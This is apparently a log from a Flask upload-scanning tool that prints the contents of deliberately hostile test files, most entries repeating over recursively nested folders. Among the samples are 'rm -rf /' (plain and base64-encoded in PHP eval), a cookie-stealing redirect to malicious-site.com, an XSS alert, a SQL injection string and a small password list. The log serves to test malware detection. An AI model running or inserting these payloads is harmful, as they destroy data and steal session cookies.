2025-02-22 20:23:00,937 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:23:00,938 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,939 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:23:00,940 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,941 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,943 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,944 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,945 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,946 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,947 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:23:00,949 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,954 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,961 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:23:00,961 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,962 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:23:00,964 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,967 - 127.0.0.1 - - [22/Feb/2025 20:23:00] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:23:00,971 - 127.0.0.1 - - [22/Feb/2025 20:23:00] "GET / HTTP/1.1" 200 -
2025-02-22 20:23:06,668 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:23:06,669 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:23:06,669 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:23:06,674 - 127.0.0.1 - - [22/Feb/2025 20:23:06] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:23:06,681 - 127.0.0.1 - - [22/Feb/2025 20:23:06] "GET / HTTP/1.1" 200 -
2025-02-22 20:25:11,271 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,276 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,278 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,280 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,282 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,283 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,285 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,286 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,287 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,288 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,294 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,300 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,303 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,305 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,306 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,307 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,308 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,310 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,311 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,316 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,318 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,319 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,322 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,323 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,326 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,327 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,328 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,330 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,331 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,332 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,333 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,338 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,340 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,341 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,342 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,343 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,344 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,345 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,347 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,348 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,349 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,350 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,351 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,352 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,354 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,355 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,356 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,357 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,358 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,359 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,361 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,362 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,363 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,364 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,365 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,367 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,368 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,369 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,371 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,372 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,376 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,377 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,381 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,383 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,384 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,385 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,386 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,387 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,393 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,394 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,395 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,403 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,404 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,405 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,407 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,408 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,415 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

